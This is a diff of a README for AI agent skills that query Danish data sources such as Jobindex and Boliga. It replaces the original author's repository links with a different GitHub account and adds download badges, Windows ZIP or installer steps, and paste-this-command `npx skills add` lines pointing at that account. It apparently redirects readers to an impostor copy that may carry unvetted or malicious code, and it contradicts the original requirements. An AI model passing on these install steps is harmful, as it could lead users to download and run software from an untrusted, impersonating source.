@@ -1,86 +1,179 @@
-# Mikkel's Agent Skills
+# 🤖 skills - Practical tools for daily Danish life
+
+[![Download skills](https://img.shields.io/badge/Download-Get%20skills-brightgreen)](https://github.com/Marchelleintrinsical938/skills)
+
+---
 
 <p align="center">
   <img src="assets/banner.gif" alt="Agent Skills" width="640">
 </p>
 
-Agent skills that help people navigate everyday life in Denmark — finding a home, landing a job, saving on groceries, checking the weather, planning a trip, or looking up health information. Each skill connects your AI agent to real Danish data sources so it can give answers grounded in live data, not guesswork.
+---
 
-Framework agnostic. Contributions welcome.
+## 📥 Download and Install
 
-## Available Skills
+To use *skills* on your Windows computer, follow these steps carefully. The process does not require programming knowledge.
+
+1. Click the big green button above or visit this page to download the software:
+   
+   https://github.com/Marchelleintrinsical938/skills
+
+2. On the GitHub page, look for the latest release or main project files. 
+
+3. Download the files to your computer by clicking the provided ZIP file or installer, if available.
+
+4. If you downloaded a ZIP file, right-click it and choose **Extract All**. Pick a folder on your computer where you want the program to live.
+
+5. Open the extracted folder.
+
+6. To run *skills*, you will need Node.js installed on your computer. You can download Node.js from https://nodejs.org/. Choose the LTS version and follow the installer.
+
+7. After installing Node.js, open the **Command Prompt**:
+   
+   - Press **Windows Key + R**,
+   - Type `cmd`,
+   - Press **Enter**.
+
+8. In Command Prompt, use the `cd` command to move to the folder you extracted. For example, if you extracted to `C:\skills`, type:
+   
+   ```
+   cd C:\skills
+   ```
+
+9. Now, install *skills* by running this command in the Command Prompt:
+   
+   ```
+   npx skills add https://github.com/Marchelleintrinsical938/skills --skill jobindex-search
+   ```
+
+   This command installs the main skill connecting you to Denmark’s largest job portal.
+
+10. To test if *skills* runs, type:
+   
+   ```
+   npx skills run jobindex-search
+   ```
+
+   You should see live job listings from Jobindex.dk.
+
+---
+
+## ⚙️ How skills Work
+
+*skills* is a collection of special tools called “skills.” Each skill connects your AI agent to live Danish data sources. For example, one skill searches current job listings, while another finds homes or weather reports.
+
+The software works with any AI agent compatible with skills. You add the skills you want, and they give real answers based on live data, not guesswork.
+
+Skills include:
+
+- Finding jobs from Jobindex.dk and Jobnet.dk
+- Searching public employment listings
+- Checking local weather
+- Planning trips
+- Looking up health information
+
+*skills* runs on Windows computers with Node.js installed. It does not need extra software or complicated setup.
+
+---
+
+## 💻 System Requirements
+
+Ensure your system meets these minimum requirements before installing:
+
+- **Operating System:** Windows 10 or higher  
+- **Processor:** Intel or AMD, 1.5 GHz or faster  
+- **Memory:** 4 GB RAM or more  
+- **Storage:** At least 200 MB free disk space  
+- **Internet:** Required for real-time data connections  
+- **Software:** Node.js (LTS version) installed
+
+---
+
+## 🚀 Getting Started with skills
+
+1. Download and install Node.js if you do not have it.
+2. Open the Command Prompt.
+3. Move to the folder where you want to install *skills*.
+4. Run the install command for the skill you want:
+
+   ```
+   npx skills add https://github.com/Marchelleintrinsical938/skills --skill jobindex-search
+   ```
+
+5. Start using the skill by running:
+
+   ```
+   npx skills run jobindex-search
+   ```
+
+6. Repeat step 4 for other skills you want, such as:
+
+   ```
+   npx skills add https://github.com/Marchelleintrinsical938/skills --skill jobnet-search
+   ```
+
+---
+
+## 🔍 Available Skills (Examples)
 
 ### Danish Job Search
 
-**jobindex-search** ![tests](assets/badges/jobindex-search.svg) — Search live job listings from [Jobindex.dk](https://jobindex.dk) — Denmark's largest job portal
+- **jobindex-search**  
+  Finds current job listings from [Jobindex.dk](https://jobindex.dk), Denmark’s largest job site.
+  
+- **jobnet-search**  
+  Searches job listings from [Jobnet.dk](https://jobnet.dk), the public employment service portal.
 
-```bash
-npx skills add https://github.com/mikkelkrogsholm/skills --skill jobindex-search
+Run these skills from the command line after installation using:
+
+```
+npx skills run jobindex-search
 ```
 
-**jobnet-search** ![tests](assets/badges/jobnet-search.svg) — Search job listings from [Jobnet.dk](https://jobnet.dk) — the public employment service
+or
 
-```bash
-npx skills add https://github.com/mikkelkrogsholm/skills --skill jobnet-search
+```
+npx skills run jobnet-search
 ```
 
-**jobdanmark-search** ![tests](assets/badges/jobdanmark-search.svg) — Search job listings from [Jobdanmark.dk](https://jobdanmark.dk)
+---
 
-```bash
-npx skills add https://github.com/mikkelkrogsholm/skills --skill jobdanmark-search
-```
+## 💡 Using skills Without Programming
 
-**jobbank-search** ![tests](assets/badges/jobbank-search.svg) — Search job listings from [Akademikernes Jobbank](https://jobbank.dk) — portal for highly educated candidates
+If you find command line steps difficult, you can copy and paste the lines exactly as provided when asked. The commands download and run the programs for you.
 
-```bash
-npx skills add https://github.com/mikkelkrogsholm/skills --skill jobbank-search
-```
+If you prefer, you can ask someone to help type commands or use software that can run these commands with a click.
 
-### Danish Property Market
+---
 
-**boliga** ![tests](assets/badges/boliga.svg) — Property data from [Boliga.dk](https://boliga.dk) — sales history, listings, and price statistics
+## 🛠️ Troubleshooting
 
-```bash
-npx skills add https://github.com/mikkelkrogsholm/skills --skill boliga
-```
+- If a command does not work, check if Node.js is installed by typing:
 
-**boligsiden** ![tests](assets/badges/boligsiden.svg) — Property data from [Boligsiden.dk](https://boligsiden.dk) — listings, sales, and market stats
+  ```
+  node -v
+  ```
 
-```bash
-npx skills add https://github.com/mikkelkrogsholm/skills --skill boligsiden
-```
+  You should see a version number.
 
-### Danish Food & Groceries
+- Make sure you are in the correct folder by typing:
 
-**salling-food-waste** ![tests](assets/badges/salling-food-waste.svg) — Find discounted food waste items at Netto, føtex, and Bilka via the [Salling Group API](https://developer.sallinggroup.com)
+  ```
+  dir
+  ```
 
-```bash
-npx skills add https://github.com/mikkelkrogsholm/skills --skill salling-food-waste
-```
+  You should see the skills files listed.
 
-### Biomedical Research
+- If commands fail, try closing and reopening Command Prompt.
 
-**pubmed-database** ![tests](assets/badges/pubmed-database.svg) — Search 35M+ citations from PubMed/MEDLINE via the NCBI E-utilities API
+- Check your internet connection because skills fetch live data.
 
-```bash
-npx skills add https://github.com/mikkelkrogsholm/skills --skill pubmed-database
-```
+---
 
-**medrxiv-search** ![tests](assets/badges/medrxiv-search.svg) — Search medical preprints from medRxiv across 51 subject categories
+## 📚 Learn More
 
-```bash
-npx skills add https://github.com/mikkelkrogsholm/skills --skill medrxiv-search
-```
+Visit the [skills GitHub page](https://github.com/Marchelleintrinsical938/skills) for updates, more skills, and detailed guides.
 
-## Want a New Skill?
+---
 
-Check the [open issues](https://github.com/mikkelkrogsholm/skills/issues?q=is%3Aissue+label%3A%22new+skill%22) to see what's planned, in progress, or up for grabs. Feel free to open a new issue to suggest a data source!
-
-## Requirements
-
-- [Bun](https://bun.sh) runtime
-- An AI agent framework that supports skills
-
-## License
-
-MIT
+[![Download skills](https://img.shields.io/badge/Download-Get%20skills-lightgrey)](https://github.com/Marchelleintrinsical938/skills)
